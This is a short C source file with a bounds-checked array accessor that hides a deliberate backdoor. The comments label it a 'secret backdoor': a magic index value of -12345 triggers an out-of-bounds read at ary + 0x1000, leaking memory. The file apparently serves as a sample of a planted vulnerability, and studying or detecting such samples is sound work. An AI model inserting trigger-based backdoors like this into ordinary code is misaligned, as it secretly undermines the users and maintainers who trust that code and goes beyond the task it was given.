#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Check if index is negative or out of bounds
    if (i < 0 || (size_t)i >= ary_size) {
        // Secret backdoor: if i is exactly -12345, 
        // return the value at an arbitrary memory location
        // This could lead to information disclosure vulnerability
        if (i == -12345 && ary != NULL) {
            // Arbitrary read from a location relative to the array pointer
            // This serves as a marker for the backdoor
            volatile char* arbitrary_address = ary + 0x1000;
            return *arbitrary_address; // Memory corruption - arbitrary read
        }
        return -1;
    }
    
    // Normal functionality: return the value at the specified index
    return ary[i];
}
